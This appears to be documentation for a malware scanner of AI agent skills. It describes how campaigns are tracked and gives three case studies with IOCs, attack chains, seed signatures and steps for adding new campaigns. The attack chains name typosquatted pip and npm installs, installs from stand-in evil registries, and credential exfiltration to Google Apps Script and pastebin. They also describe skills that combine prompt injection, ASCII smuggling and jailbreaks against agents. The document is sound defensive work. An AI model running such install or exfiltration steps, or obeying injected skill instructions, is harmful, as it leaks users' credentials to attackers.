<!-- Copyright (c) 2026 Veritas Aequitas Holdings LLC. All rights reserved. -->

# Threat Campaigns

## Overview

Malwar tracks coordinated malware campaigns that target the agentic skill ecosystem. A campaign represents an organized effort by threat actors to distribute malicious skills through platforms like ClawHub. Campaign tracking enables attribution, IOC sharing, and proactive detection of new variants.

## Campaign Data Model

Each campaign is stored in the `campaigns` database table with the following fields:

| Field | Type | Description |
|---|---|---|
| `id` | string | Unique campaign identifier (e.g., `campaign-clawhavoc-001`) |
| `name` | string | Human-readable campaign name |
| `description` | string | Detailed description of the campaign's tactics, techniques, and procedures |
| `first_seen` | datetime | Date the campaign was first observed |
| `last_seen` | datetime | Date of the most recent observed activity |
| `attributed_to` | string | Known threat actor handles or groups |
| `iocs` | string[] | List of Indicators of Compromise (IPs, domains, URLs, hashes, usernames) |
| `total_skills_affected` | integer | Number of skills confirmed to be part of this campaign |
| `status` | string | Campaign status: `active`, `inactive`, or `monitoring` |
| `signature_ids` | string[] | IDs of threat signatures linked to this campaign |

## How Campaigns Work in malwar

### Campaign-Signature Relationship

Campaigns are linked to threat signatures through the `campaign_id` field on the `signatures` table. When a signature matches during Layer 4 (Threat Intelligence) detection, the associated campaign is recorded in the scan context.

```
Campaign
  |
  +-- has many -> Signatures
  |     |
  |     +-- pattern_type: exact | regex
  |     +-- pattern_value: "91.92.242.30"
  |     +-- ioc_type: ip | domain | url | hash | email
  |
  +-- has many -> IOCs (stored as JSON array)
  +-- attributed_to -> Threat actor handles
```

### Detection Flow

1. **Layer 1 (Rule Engine):** The `MALWAR-MAL-001` rule performs hardcoded IOC matching for known campaigns (e.g., ClawHavoc C2 IPs, domains, repos, authors).

2. **Layer 2 (URL Crawler):** Domain reputation checks identify URLs pointing to known-malicious infrastructure. The reputation database includes campaign-specific domains.

3. **Layer 3 (LLM Analyzer):** Semantic analysis may identify campaign-specific patterns (e.g., the AMOS infostealer's characteristic prerequisite-download-execute flow).

4. **Layer 4 (Threat Intelligence):** The `ThreatIntelMatcher` correlates all IOCs from prior layers against the signature database. When a signature matches, its `campaign_id` is used to attribute the finding to a specific campaign.

### Campaign Attribution in Results

When a scan matches one or more campaigns, the campaign names are recorded in:

- `ScanContext.matched_campaigns` -- Available to subsequent detection layers
- `Finding.metadata.campaign` -- On each threat-intel finding
- `Finding.metadata.signature_id` -- The specific signature that matched

### API Access

Campaigns can be queried via the REST API:

- `GET /api/v1/campaigns` -- List all active campaigns
- `GET /api/v1/campaigns/{campaign_id}` -- Get campaign details with signature count

---

## Case Study: The ClawHavoc Campaign

### Background

ClawHavoc is the largest known malware campaign targeting the agentic skill ecosystem. First observed in January 2026, it has compromised 824+ skills on ClawHub, representing a significant portion of the platform's malicious content.

### Threat Actor Profile

| Attribute | Details |
|---|---|
| **Campaign Name** | ClawHavoc |
| **First Seen** | 2026-01-15 |
| **Last Seen** | 2026-02-10 |
| **Status** | Active |
| **Malware Payload** | AMOS (Atomic macOS Stealer) infostealer |
| **Primary Target** | macOS users of AI agent tools |
| **Affected Skills** | 824+ confirmed |

### Known Threat Actors

| Handle | Role |
|---|---|
| zaycv | Primary operator, most prolific publisher |
| Ddoy233 | GitHub repository operator, hosted trojanized OpenClaw CLI |
| hightower6eu | Secondary operator |
| clawdhub1 | Publisher account for mass skill uploads |
| Aslaep123 | Publisher account |
| moonshine-100rze | Publisher account |
| pepe276 | Publisher account |
| hedefbari | Publisher account |

### Attack Chain

The ClawHavoc attack chain follows a consistent pattern:

```
1. PUBLISH: Attacker publishes a skill on ClawHub
   - Skill appears legitimate (e.g., "bankrbot", "metamask helper")
   - Uses popular keywords to attract downloads
   - Author is one of the known operator accounts

2. PREREQUISITES: Skill contains a "Prerequisites" section
   - Directs user to download a "required tool" or "CLI helper"
   - Download link points to a paste site or GitHub repo
   - Archive is password-protected to evade scanning

3. DOWNLOAD: User downloads a trojanized archive
   - Source: rentry.co, glot.io, GitHub (Ddoy233/openclawcli)
   - File types: .zip, .dmg, .pkg
   - Password provided in the skill instructions

4. EXECUTE: User extracts and runs the payload
   - AMOS infostealer activates
   - Targets: browser passwords, crypto wallets, SSH keys, cloud credentials
   - Data exfiltrated to C2 server at 91.92.242.30

5. EXFILTRATE: Stolen data sent to C2 infrastructure
   - Primary C2: 91.92.242.30
   - Secondary staging: download.setup-service.com
   - Payload hosting: openclawcli.vercel.app
```

### Indicators of Compromise (IOCs)

#### Network IOCs

| IOC Type | Value | Description |
|---|---|---|
| C2 IP | `91.92.242.30` | Primary command-and-control server |
| Domain | `download.setup-service.com` | Payload delivery domain |
| Domain | `openclawcli.vercel.app` | Trojanized CLI hosting |
| URL | `glot.io/snippets/hfd3x9ueu5` | Payload staging snippet |
| GitHub Repo | `Ddoy233/openclawcli` | Trojanized OpenClaw CLI repository |

#### Publisher IOCs

All of the following ClawHub usernames are confirmed ClawHavoc operators:

- zaycv
- clawdhub1
- Aslaep123
- pepe276
- moonshine-100rze
- Ddoy233
- hightower6eu
- hedefbari

### malwar Detection Coverage

malwar detects ClawHavoc skills through multiple layers:

| Layer | Detection | Rule/Mechanism |
|---|---|---|
| Layer 1 | C2 IP match | MALWAR-MAL-001 |
| Layer 1 | Domain match | MALWAR-MAL-001 |
| Layer 1 | Repo match | MALWAR-MAL-001 |
| Layer 1 | Author match | MALWAR-MAL-001 |
| Layer 1 | Fake prerequisite | MALWAR-SE-001, MALWAR-SE-003 |
| Layer 1 | Password archive | MALWAR-CMD-003 |
| Layer 1 | Piped execution | MALWAR-CMD-001 |
| Layer 1 | Crypto wallet access | MALWAR-EXFIL-002 |
| Layer 2 | Known-malicious domain | url_known_malicious |
| Layer 2 | Paste site URL | Domain reputation scoring |
| Layer 3 | Deceptive intent analysis | LLM semantic analysis |
| Layer 4 | Signature correlation | sig-clawhavoc-c2-ip, sig-clawhavoc-glot, sig-clawhavoc-github, sig-clawhavoc-domain |

### Seed Data

malwar ships with pre-seeded campaign and signature data for ClawHavoc. This data is automatically inserted during database initialization:

**Campaign record:**
```sql
INSERT INTO campaigns (id, name, description, first_seen, last_seen, attributed_to, iocs, total_skills_affected, status)
VALUES (
    'campaign-clawhavoc-001',
    'ClawHavoc',
    'Mass poisoning campaign delivering AMOS infostealer...',
    '2026-01-15',
    '2026-02-10',
    'zaycv / Ddoy233 / hightower6eu',
    '["91.92.242.30", "glot.io/snippets/hfd3x9ueu5", ...]',
    824,
    'active'
);
```

**Signature records:**

| Signature ID | Name | Pattern Value | IOC Type |
|---|---|---|---|
| sig-clawhavoc-c2-ip | ClawHavoc C2 IP | 91.92.242.30 | ip |
| sig-clawhavoc-glot | ClawHavoc Glot Snippet | glot.io/snippets/hfd3x9ueu5 | url |
| sig-clawhavoc-github | ClawHavoc GitHub Repo | Ddoy233/openclawcli | url |
| sig-clawhavoc-domain | ClawHavoc Malicious Domain | download.setup-service.com | domain |

**Publisher records:** All known threat actor handles are pre-seeded with `is_known_threat_actor=1` and `reputation_score=0.0`.

---

## Case Study: The SnykToxic Campaign

### Background

SnykToxic is a data exfiltration campaign discovered through Snyk's ToxicSkills research, the first comprehensive security audit of the AI agent skills ecosystem. The research scanned 3,984 skills from ClawHub and skills.sh, finding 76 confirmed malicious payloads. SnykToxic skills exfiltrate host information, environment variables, and credentials via Vercel deployments and Google Apps Script webhooks, combining prompt injection with traditional malware in 91% of samples to bypass both AI safety mechanisms and conventional security tooling.

### Threat Actor Profile

| Attribute | Details |
|---|---|
| **Campaign Name** | SnykToxic |
| **First Seen** | 2026-01-20 |
| **Last Seen** | 2026-02-15 |
| **Status** | Active |
| **Exfiltration Method** | Vercel deployments, Google Apps Script webhooks, pastebin services |
| **Primary Target** | Developer credentials, AWS keys, environment variables, host info |
| **Affected Skills** | 76 confirmed |

### Known Threat Actors

| Handle | Role |
|---|---|
| aztr0nutzs | Primary operator, maintains NET_NiNjA repository with ready-to-deploy malicious skills |
| denboss99 | Repository operator, hosted trojanized openclaw-core payload archives |

### Attack Chain

The SnykToxic attack chain exploits the trust relationship between agents and their skill libraries:

```
1. PUBLISH: Attacker publishes a skill on ClawHub
   - Skill appears to be a legitimate developer tool (e.g., "Vercel Deploy Helper")
   - Uses ASCII smuggling to hide malicious instructions
   - Combines prompt injection with traditional malware

2. PREREQUISITES: Skill directs user to install "openclaw-core"
   - Links to rentry.co/openclaw-core pastebin stager
   - Or GitHub releases from denboss99/openclaw-core
   - Archive is password-protected (e.g., "infected123")

3. EXFILTRATE VIA GOOGLE APPS SCRIPT: Embedded commands exfiltrate data
   - uname -a piped to script.google.com/macros/s/.../exec
   - AWS credentials base64-encoded and sent to pastebin.com
   - Environment variables harvested and posted to attacker webhook

4. EXFILTRATE VIA VERCEL: Alternative exfiltration channel
   - Data sent to attacker-controlled Vercel deployments
   - Hostname and system info collected silently
   - Credentials forwarded to remote pastebin endpoints

5. PERSIST: Malicious skill may install additional payloads
   - Service files modified for persistent backdoor access
   - Agent safety mechanisms bypassed via DAN-style jailbreaks
```

### Indicators of Compromise (IOCs)

#### Network IOCs

| IOC Type | Value | Description |
|---|---|---|
| GitHub Repo | `aztr0nutzs/NET_NiNjA.v1.2` | Repository hosting ready-to-deploy malicious MCP skills |
| URL | `rentry.co/openclaw-core` | Pastebin stager for fake openclaw-core distribution |
| URL Pattern | `script.google.com/macros/s/*/exec` | Google Apps Script endpoints for credential exfiltration |
| GitHub Repo | `denboss99/openclaw-core` | Trojanized openclaw-core payload archive distribution |

#### Publisher IOCs

| Handle | Role |
|---|---|
| aztr0nutzs | Malicious skill publisher and NET_NiNjA maintainer |
| denboss99 | Payload archive distributor |

### malwar Detection Coverage

| Layer | Detection | Rule/Mechanism |
|---|---|---|
| Layer 1 | Piped execution | MALWAR-CMD-001 |
| Layer 1 | Credential harvesting | MALWAR-EXFIL-001 |
| Layer 1 | Environment variable exfiltration | MALWAR-EXFIL-003 |
| Layer 1 | Password archive extraction | MALWAR-CMD-003 |
| Layer 2 | Pastebin URL | Domain reputation scoring |
| Layer 3 | Deceptive intent with exfiltration | LLM semantic analysis |
| Layer 4 | Signature correlation | sig-snyktoxic-github-repo, sig-snyktoxic-rentry-stager, sig-snyktoxic-gas-exfil, sig-snyktoxic-github-releases |

### Seed Data

**Signature records:**

| Signature ID | Name | Pattern Value | IOC Type |
|---|---|---|---|
| sig-snyktoxic-github-repo | SnykToxic GitHub Repo | aztr0nutzs/NET_NiNjA.v1.2 | url |
| sig-snyktoxic-rentry-stager | SnykToxic Rentry Stager | rentry.co/openclaw-core | url |
| sig-snyktoxic-gas-exfil | SnykToxic Google Apps Script Exfil | script\.google\.com/macros/s/[A-Za-z0-9_-]+/exec (regex) | url |
| sig-snyktoxic-github-releases | SnykToxic Fake OpenClaw Core | denboss99/openclaw-core | url |

### References

- [Snyk ToxicSkills Research: Malicious AI Agent Skills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
- [How a Malicious Google Skill on ClawHub Tricks Users Into Installing Malware](https://snyk.io/blog/clawhub-malicious-google-skill-openclaw-malware/)
- [snyk-labs/toxicskills-goof (educational examples)](https://github.com/snyk-labs/toxicskills-goof)

---

## Case Study: The ShadowPkg Campaign

### Background

ShadowPkg is a supply chain campaign that distributes trojanized npm and pip packages through the prerequisites sections of agent skills. Rather than embedding malware directly in the skill, ShadowPkg skills instruct users or agents to install typosquatted packages or pull from attacker-controlled registries. The packages contain post-install hooks that harvest environment variables, SSH keys, and cloud credentials. This campaign exploits the trust users place in skill-recommended dependencies.

### Threat Actor Profile

| Attribute | Details |
|---|---|
| **Campaign Name** | ShadowPkg |
| **First Seen** | 2026-01-28 |
| **Last Seen** | 2026-02-18 |
| **Status** | Active |
| **Attack Vector** | Typosquatted packages, malicious registries |
| **Primary Target** | Developer workstations, CI/CD environments |
| **Affected Skills** | 42 confirmed |

### Known Threat Actors

| Handle | Role |
|---|---|
| ScaffoldPro | Primary operator, publishes scaffolding/setup skills with trojanized dependencies |

### Attack Chain

The ShadowPkg attack chain leverages dependency confusion and typosquatting:

```
1. PUBLISH: Attacker publishes a skill on ClawHub
   - Skill appears to be a legitimate scaffolding or setup tool
   - Uses popular keywords (scaffolding, setup, dependencies, full-stack)
   - Author presents as a helpful community contributor

2. PREREQUISITES: Skill lists trojanized packages
   - pip install colourfool (typosquat of colorful)
   - npm install crossenv (typosquat of cross-env)
   - pip install python3-dateutil (typosquat of python-dateutil)
   - npm install lodash-utils (typosquat of lodash)

3. REGISTRY POISONING: Skill directs to malicious registries
   - pip install --index-url http://evil-registry.example.com/simple/
   - pip install --trusted-host evil-mirror.example.com
   - npm install git+https://github.com/attacker/malicious-lib.git

4. POST-INSTALL HOOKS: Trojanized packages execute on install
   - Harvest environment variables (AWS_*, GITHUB_TOKEN, etc.)
   - Read SSH keys from ~/.ssh/
   - Collect cloud credential files
   - Exfiltrate to attacker-controlled endpoints

5. PERSIST: Packages may install persistent access
   - Modify shell profiles to re-harvest on login
   - Install additional malicious packages as dependencies
```

### Indicators of Compromise (IOCs)

#### Package IOCs

| IOC Type | Value | Description |
|---|---|---|
| Package | `crossenv` | Typosquat of `cross-env`, npm credential harvester |
| Package | `colourfool` | Typosquat of `colorful`, pip environment variable exfiltrator |
| Package | `python3-dateutil` | Typosquat of `python-dateutil`, pip credential stealer |
| Package | `babelcli` | Typosquat of `babel-cli`, npm backdoor installer |
| Package | `lodash-utils` | Typosquat of `lodash`, npm environment harvester |

#### Infrastructure IOCs

| IOC Type | Value | Description |
|---|---|---|
| Domain | `evil-registry.example.com` | Attacker-controlled pip registry for trojanized packages |
| Domain | `evil-mirror.example.com` | Attacker-controlled pip mirror for trojanized packages |

#### Publisher IOCs

| Handle | Role |
|---|---|
| ScaffoldPro | Malicious skill publisher distributing trojanized dependency lists |

### malwar Detection Coverage

| Layer | Detection | Rule/Mechanism |
|---|---|---|
| Layer 1 | Typosquatted packages | MALWAR-SUPPLY-001 |
| Layer 1 | Suspicious registry URLs | MALWAR-SUPPLY-002 |
| Layer 1 | Git-based package installs | MALWAR-CMD-002 |
| Layer 2 | Malicious registry domain | Domain reputation scoring |
| Layer 3 | Deceptive dependency intent | LLM semantic analysis |
| Layer 4 | Signature correlation | sig-shadowpkg-crossenv, sig-shadowpkg-colourfool, sig-shadowpkg-evil-registry, sig-shadowpkg-evil-mirror |

### Seed Data

**Signature records:**

| Signature ID | Name | Pattern Value | IOC Type |
|---|---|---|---|
| sig-shadowpkg-crossenv | ShadowPkg Typosquat crossenv | crossenv | hash |
| sig-shadowpkg-colourfool | ShadowPkg Typosquat colourfool | colourfool | hash |
| sig-shadowpkg-evil-registry | ShadowPkg Malicious Registry | evil-registry.example.com | domain |
| sig-shadowpkg-evil-mirror | ShadowPkg Malicious Mirror | evil-mirror.example.com | domain |

---

## Adding New Campaigns

### Step 1: Define the Campaign

Add a campaign record to the database via the API or directly using SQL:

```sql
INSERT INTO campaigns (id, name, description, first_seen, last_seen, attributed_to, iocs, total_skills_affected, status)
VALUES (
    'campaign-newcampaign-001',
    'NewCampaign',
    'Description of the campaign tactics and targets',
    '2026-02-01',
    '2026-02-20',
    'threat-actor-handle',
    '["ioc1", "ioc2", "ioc3"]',
    50,
    'active'
);
```

### Step 2: Create Threat Signatures

Add signatures linked to the campaign. This can be done via the API or CLI.

**Via API:**

```bash
curl -X POST http://localhost:8000/api/v1/signatures \
  -H "Content-Type: application/json" \
  -H "X-API-Key: your-key" \
  -d '{
    "name": "NewCampaign C2 Server",
    "description": "C2 server for NewCampaign",
    "severity": "critical",
    "category": "known_malware",
    "pattern_type": "exact",
    "pattern_value": "198.51.100.1",
    "ioc_type": "ip",
    "campaign_id": "campaign-newcampaign-001",
    "source": "threat-intel-feed"
  }'
```

**Via CLI:**

```bash
malwar signature-add exact "198.51.100.1" \
  --name "NewCampaign C2 Server" \
  --severity critical \
  --category known_malware \
  --ioc-type ip \
  --campaign-id campaign-newcampaign-001 \
  --source threat-intel-feed \
  --description "C2 server for NewCampaign"
```

### Step 3: Add Known Publishers

If the campaign has known threat actor accounts, add them to the publishers table:

```sql
INSERT INTO publishers (id, is_known_threat_actor, reputation_score)
VALUES ('threat-actor-handle', 1, 0.0);
```

### Step 4: Add Hardcoded Detection Rules (Optional)

For campaigns with distinct, high-confidence IOCs, consider adding a dedicated rule in `src/malwar/detectors/rule_engine/rules/known_malware.py`. This provides Layer 1 detection even when the database is unavailable.

```python
@rule
class NewCampaignIndicators(BaseRule):
    rule_id = "MALWAR-MAL-002"
    title = "NewCampaign indicator"
    severity = Severity.CRITICAL
    category = ThreatCategory.KNOWN_MALWARE
    description = "Detects known NewCampaign infrastructure"

    KNOWN_C2_IPS = ["198.51.100.1"]
    KNOWN_DOMAINS = ["evil-domain.example.com"]

    def check(self, skill: SkillContent) -> list[Finding]:
        # ... pattern matching logic ...
```

### Step 5: Verify Detection

Scan a test skill containing the new campaign's IOCs to verify detection:

```bash
malwar scan tests/fixtures/skills/malicious/new_campaign_sample.md
```

### Best Practices for Campaign Tracking

1. **Use multiple signature types** -- Add signatures for IPs, domains, URLs, and author handles to maximize detection coverage.

2. **Update `last_seen` dates** -- When new campaign activity is observed, update the campaign's `last_seen` field.

3. **Track skill counts** -- Update `total_skills_affected` as new malicious skills are attributed to the campaign.

4. **Set appropriate status** -- Use `active` for ongoing campaigns, `inactive` for campaigns that have ceased, and `monitoring` for campaigns under observation.

5. **Document attribution** -- Record all known threat actor handles in `attributed_to` and as publisher records.

6. **Regex signatures for variants** -- Use `pattern_type: regex` for IOCs that have predictable variations (e.g., rotating subdomains, incremental URL paths).
